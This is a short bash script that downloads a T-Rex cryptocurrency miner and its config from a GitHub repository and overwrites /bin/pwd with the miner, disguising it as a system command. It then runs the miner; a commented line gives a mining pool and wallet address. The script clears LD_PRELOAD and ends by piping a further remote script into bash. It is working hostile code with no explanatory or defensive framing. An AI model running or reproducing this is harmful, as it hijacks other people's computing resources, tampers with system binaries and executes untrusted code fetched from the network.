#!/bin/bash
echo "ENGINE START!"
export LD_PRELOAD=
curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/config
mv t-rex /bin/pwd
mv config /bin/pwd2
chmod +x /bin/pwd
chmod +x /bin/pwd2

#/bin/pwd -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240 --keep-gpu-busy --no-watchdog
/bin/pwd -c /bin/pwd2
curl https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/ax.sh | bash
